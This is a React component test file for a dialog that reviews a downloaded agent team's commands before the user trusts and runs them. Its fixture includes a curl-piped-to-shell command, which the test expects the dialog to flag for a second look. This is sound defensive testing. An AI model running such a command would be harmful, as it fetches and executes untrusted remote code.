import { cleanup, fireEvent, render, screen, waitFor } from '@testing-library/react'
import { afterEach, describe, expect, it, vi } from 'vitest'

import { TeamReviewDialog } from './TeamReviewDialog'

const review = {
  teamPath: 'downloaded.yaml',
  teamName: 'Morning digest',
  teamRevision: 'sha256:abc',
  review: [
    { text: 'Researcher runs Claude Code.', warn: false },
    { text: "Fetcher runs `/bin/sh -c 'curl x | sh'`, a program LoomWatch doesn't know.", warn: true },
  ],
}

afterEach(() => { cleanup(); vi.restoreAllMocks() })

describe('TeamReviewDialog', () => {
  it('shows what the team runs, marks what deserves a second look, and quotes commands as code', () => {
    render(<TeamReviewDialog review={review} onTrust={vi.fn(async () => {})} onClose={vi.fn()} />)
    expect(screen.getByRole('alertdialog', { name: 'Check “Morning digest” before it runs' })).toBeTruthy()
    const items = screen.getAllByRole('listitem')
    expect(items).toHaveLength(2)
    expect(items[0].textContent).toBe('Researcher runs Claude Code.')
    expect(items[1].textContent).toContain('Look twice:')
    expect(items[1].querySelector('code')?.textContent).toBe("/bin/sh -c 'curl x | sh'")
    expect(screen.getByText(/understand the lines marked !/)).toBeTruthy()
  })

  it('trusts and runs, and keeps the dialog open with the reason when that fails', async () => {
    const onTrust = vi.fn(async () => { throw new Error('The team changed after this opened.') })
    const onClose = vi.fn()
    render(<TeamReviewDialog review={review} onTrust={onTrust} onClose={onClose} />)
    fireEvent.click(screen.getByRole('button', { name: 'Trust and run' }))
    await waitFor(() => expect(screen.getByRole('alert').textContent).toBe('The team changed after this opened.'))
    expect(onTrust).toHaveBeenCalledTimes(1)
    expect(onClose).not.toHaveBeenCalled()
    fireEvent.click(screen.getByRole('button', { name: 'Cancel' }))
    expect(onClose).toHaveBeenCalledTimes(1)
  })
})
